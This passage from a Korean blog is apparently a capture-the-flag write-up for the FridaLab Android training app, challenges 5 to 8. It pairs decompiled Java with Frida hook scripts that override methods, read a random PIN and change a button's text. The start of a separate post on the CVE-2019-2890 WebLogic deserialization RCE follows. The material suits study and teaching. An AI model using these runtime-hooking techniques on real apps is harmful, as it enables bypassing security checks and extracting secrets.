class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall05.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line"></span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt;</span><br><span class="line">Challenge 5 : Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/5.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. 이번에는 <code>Java.use</code>를 이용해서 클래스를 가져와서 <code>implementation</code>을 이용해 함수를 재정의 해주었습니다. 함수 재정의는 <code>this.함수</code>를 이용해서 chall05 함수가 호출될 때 항상 <code>frida</code>라는 문자열을 인자로 전송하게 해주었습니다. 그리고 저기서 <code>this</code>는 현재 호출한 객체를 가리키고 있습니다.<br></p><hr><h2 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title=" Challenge 6"></a><span style="color:#21C587"></span> Challenge 6</h2><blockquote><p>FridaLab 여섯 번째 문제는 Chall6() 메서드를 10초 후에 올바른 값과 함께 실행해주면 됩니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chall06</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (challenge_06.confirmChall06(i)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 정수를 인자로 받고, 받은 인자를 <code>confirmChall06()</code> 메서드로 넘겨주는 것을 볼 수 있습니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> uk.rossmarks.fridalab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">challenge_06</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> chall06;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> timeStart;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">startTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        timeStart = System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">confirmChall06</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i == chall06 &amp;&amp; System.currentTimeMillis() &gt; timeStart + <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addChall06</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        chall06 += i;</span><br><span class="line">        <span class="keyword">if</span> (chall06 &gt; <span class="number">9000</span>) &#123;</span><br><span class="line">            chall06 = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>confirmChall06()</code> 메서드를 확인해보면 인자 값 i와 chall06 값이 같고, 현재 시간이 <code>timeStart + 10000</code>보다 크면 참을 반환하게 됩니다. 일단 <code>10000</code>은 10 sec이기 때문에 <code>setTimeout()</code>를 이용해서 쉽게 처리할 수 있습니다.</p><p>이제 남은 건 <code>i</code>와 <code>chall06</code>의 값이 같아야 하는 조건만 남았습니다. <code>chall06</code>의 값은 <code>addChall06()</code> 메서드에 의해서 생성이 되는데 이 메서드가 <code>MainActivity</code> 어딘가에서 호출이 되고 있을 것 입니다. 하지만 그 부분은 볼 필요가 없는게 그냥 <code>addChall06()</code> 메서드에서 초기화된 <code>chall06</code>의 값을 <code>confirmChall06()</code> 메서드의 인자 값으로 바로 넘겨주게 재정의하면 됩니다. 그럼 <code>i</code>와 <code>chall06</code>이 같아지므로 풀리게 됩니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;\n After 10 sec&quot;</span>);</span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> cls = Java.use(<span class="string">&quot;uk.rossmarks.fridalab.challenge_06&quot;</span>);</span><br><span class="line">cls.addChall06.overload(<span class="string">&quot;int&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">arg0</span>)</span>&#123;</span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">b.chall06(cls.chall06.value);</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;\nSuccess&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;, <span class="number">10000</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall06.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line"></span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt;</span><br><span class="line"> After 10 sec</span><br><span class="line"></span><br><span class="line">Success</span><br><span class="line"></span><br><span class="line">Success</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-02-23%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%205.27.34.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. 제일 먼저 <code>setTimeout()</code> 메서들 이용해서 10초 지연시켜주고, <code>implementation()</code>를 이용해서 <code>addChall06()</code> 메소드가 실행될 때 마다 <code>chall06</code>의 값을 <code>chall06()</code>의 인자 값으로 넘겨주게 해주었습니다. 그리고 <code>implementation()</code>를 사용하기 전에 <code>overload()</code>를 이용해서 인자 값이 타입을 <code>int</code>로 지정해주었습니다. 문자열일 때는 오버로드를 안 해줘도 되는데 정수형일 때는 따로 지정을 해줘야 하는 이유는 아마 기본으로 <code>String</code>로 설정이 되어 있는 거 같습니다.<br></p><hr><h2 id="Challenge-7"><a href="#Challenge-7" class="headerlink" title=" Challenge 7"></a><span style="color:#21C587"></span> Challenge 7</h2><blockquote><p>FridaLab 일곱 번째 문제는 Burute Force를 해서 핀 번호를 알아내는 문제입니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chall07</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (challenge_07.check07Pin(str)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 <code>chall07()</code> 메서드로 인자 값을 하나 넘겨주고, 해당 인자 값이 Pin 번호와 일치하면 풀리게 됩니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> uk.rossmarks.fridalab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">challenge_07</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String chall07;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setChall07</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        chall07 = BuildConfig.FLAVOR + (((<span class="keyword">int</span>) (Math.random() * <span class="number">9000.0d</span>)) + <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check07Pin</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str.equals(chall07);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check07Pin()</code> 메서드를 확인해보면 <code>chall07</code>의 값과 인자 값을 비교하는 것을 볼 수 있고, 바로 위에 <code>setChall07()</code> 메소드에 의해서 <code>chall07</code>이 초기화되는 것을 볼 수 있습니다. 랜던 값을 사용하기 때문에 육안상으로 알아내는 것은 힘들어 보이지만 6번에서 풀었던 방식과 비슷하게 <code>setChall07()</code> 메서드에서 초기화되는 <code>chall07</code>의 값을 바로 <code>chall07()</code> 메서드에 인자 값으로 넘겨주면 될 거 같습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> cls = Java.use(<span class="string">&quot;uk.rossmarks.fridalab.challenge_07&quot;</span>);</span><br><span class="line">cls.setChall07();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Pin : &quot;</span> + cls.chall07.value);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall07.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Pin : 8136</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt; q</span><br><span class="line"></span><br><span class="line">Thank you for using Frida!</span><br></pre></td></tr></table></figure><p>일단 위와 같이 핀을 찾는 코드를 작성하고 후킹을 해주니 <code>chall07</code>의 값을 잘 찾는 것을 볼 수 있습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> cls = Java.use(<span class="string">&quot;uk.rossmarks.fridalab.challenge_07&quot;</span>);</span><br><span class="line">cls.setChall07();</span><br><span class="line"><span class="keyword">const</span> pin = cls.chall07.value</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Pin : &quot;</span> + pin);</span><br><span class="line"></span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">a.chall07(pin);</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall07.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Pin : 9265</span><br><span class="line">Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/7.png?raw=true"></p><p>자바스크립트를 이용해서 익스 코드를 위와 같이 작성해주었습니다. 찾은 pin 값을 <code>chall07()</code> 메서드의 인자로 바로 념겨주도록 만들었습니다.<br></p><h2 id="Challenge-8"><a href="#Challenge-8" class="headerlink" title=" Challenge 8"></a><span style="color:#21C587"></span> Challenge 8</h2><blockquote><p>FridaLab 여덟 번째 문제는 버튼의 이름을 “Confirm”으로 바꿔줘야 합니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">chall08</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((String) ((Button) findViewById(R.id.check)).getText()).equals(<span class="string">&quot;Confirm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chall08()</code> 메서드의 코드를 보면 <code>findViewById</code>를 이용해서 특정 값을 가져와서 버튼 객체로 만들어주고, <code>getText()</code> 메서드를 이용해서 문자열을 가져와 해당 값과 <code>Confirm</code>과 비교하는 것을 볼 수 있습니다.<br>여기서 <code>getText()</code> 메서드로 가져온 값이 <code>Confirm</code>이면 버튼이 <code>Confirm</code>으로 바뀔 거 같습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static final int check &#x3D; 2131165231;</span><br></pre></td></tr></table></figure><p><code>R.id.check</code>의 값을 확인해보면 <code>2131165231</code>이라는 값을 가져와서 <code>findViewById()</code> 메서드의 인자로 넘겨주고 있습니다. 그럼 우린 <code>(Button) findViewById(R.id.check))</code>에다가 <code>setText()</code> 메서드를 이용해서 <code>Confirm</code>이라는 문자열을 넣어주면 <code>getText()</code> 메서드로 문자열을 가져 올 때, <code>Confirm</code>이라는 문자열을 가져와 비교를 할 것 입니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> button = Java.use(<span class="string">&quot;android.widget.Button&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> string = Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> checkid = a.findViewById(<span class="number">2131165231</span>);</span><br><span class="line"><span class="keyword">const</span> checkid_ = Java.cast(checkid, button);</span><br><span class="line">checkid_.setText(string.$new(<span class="string">&quot;Confirm&quot;</span>));</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span> ~/APP/FridaLab  frida -U -l chall08.js uk.rossmarks.fridalab</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line"></span><br><span class="line">Error: android.view.ViewRootImpl$CalledFromWrongThreadException: Only the original thread that created a view hierarchy can touch its views.</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js:126</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:1079</span><br><span class="line">    at &#x2F;chall08.js:9</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:332</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:264</span><br><span class="line">    at Qe (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;android.js:417)</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt; q</span><br><span class="line"></span><br><span class="line">Thank you for using Frida!</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/8.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. 일단 <code>Java.choose()</code>를 이용해 인스턴스를 가져와서 <code>check</code> 값을 가져오고, <code>Java.cast()</code>를 이용해서 check의 타입을 버튼으로 바꿔줍니다. 그리고 <code>setText()</code>를 이용해서 <code>Confirm</code>이라는 문자열을 넣어주는데 이때 전송할 때는 <code>String</code> 타입으로 전송해주어야 합니다. 이유는 <code>setText()</code> 메서드에서 호환되는 타입이 정해져있기 때문입니다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2890 Unserialize RCE in Oracle WebLogic</title>
      <link href="2021/02/10/2021-02-10-CVE-2019-2890/"/>
      <url>2021/02/10/2021-02-10-CVE-2019-2890/</url>
      
        <content type="html"><![CDATA[<p>예전부터 분석을 하고, 글을 작성하려 했지만 게으름 탓인 지 2020년에 할려 했던 걸 지금 하고 있습니다. 이번 취약점은 오라클에서 제공하는 Oracle Fusion Middleware의 웹 로직 서버에서 발견 된 역직렬화 RCE 취약점입니다. 해당 웹 로직 서버에서는 데이터를 T3 프로토콜을 이용해서 전달하는데, 안전하게 전달하기 위해서 <code>Serialize</code> -&gt; <code>encryption</code> -&gt; <code>Decryption</code> -&gt; <code>Unserialize</code>와 같은 과정을 거쳐 전달한다고 합니다. 하지만 데이터에 대한 검증 절차가 존재하지 않아 데이터를 역직렬화 할 때 RCE 취약점이 터지게 됩니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-2890</td><td>WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</td><td>7.2</td></tr></tbody></table><p><br>VE-2019-2890는 WebLogic Server <code>10.3.6.0.0</code>, <code>12.1.3.0.0</code>, <code>12.2.1.3.0</code>에서 모두 발생했고, 2019년 10월 16일에 POC가 공개됐고, 10월에 바로 긴급패치를 발표했다고 합니다.<br></p><hr><h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title=" CVE-2019-2890"></a><span style="color:#21C587"></span> CVE-2019-2890</h2><p>취약점은 <code>PersistentContext</code> 클래스에서 발생합니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (SubjectManager.getSubjectManager().isKernelIdentity(<span class="keyword">this</span>._subject)) &#123;</span><br><span class="line">        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span><br><span class="line">        getSubjectManager().getAnonymousSubject();</span><br><span class="line">        var3.writeObject(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var3.writeObject(<span class="keyword">this</span>._subject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">        var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    &#125;</span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeSubject</code> 메서드는 데이터를 직렬화 